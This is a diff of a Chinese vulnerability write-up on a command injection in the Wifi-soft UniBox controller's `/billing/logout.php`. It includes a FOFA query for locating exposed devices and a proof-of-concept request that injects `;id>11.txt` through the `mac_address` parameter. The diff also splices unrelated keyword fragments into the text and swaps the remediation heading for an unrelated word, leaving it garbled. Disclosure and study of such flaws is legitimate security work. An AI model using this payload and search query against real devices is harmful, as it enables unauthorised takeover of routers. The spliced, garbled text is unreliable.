@@ -8,8 +8,6 @@ asset_dir: embedded-base64
 
 Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/billing/logout.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。
 
-网络设备
-
 # 影响版本
 
 # fofa语法
@@ -17,6 +15,14 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/
 > `body="Unibox" && body="Controller" || body="www.wifi-soft.com"`
 
 # 漏洞分析
+
+深入探索
+
+授权
+
+脚本
+
+安全研究报告
 
 直接看 `/billing/logout.php` 的业务实现造成漏洞的关键部分如下
 
@@ -59,12 +65,20 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/
 
 > 支持cookie获取参数，注意检测点，别漏
 >
-> 漏洞修复方案
+> 网络设备
 
 ```
 GET /billing/logout.php?logout_user=1&mac_address=;id>11.txt HTTP/1.1
 Host: unibox.mrxn.net
 ```
+
+深入探索
+
+企业安全咨询
+
+安全
+
+安全工具开发
 
 访问命令执行结果文件 `/billing/11.txt`
 
@@ -72,4 +86,4 @@ Host: unibox.mrxn.net
 
 成功获得 `id` 命令执行的结果
 
-网络安全
+漏洞扫描服务
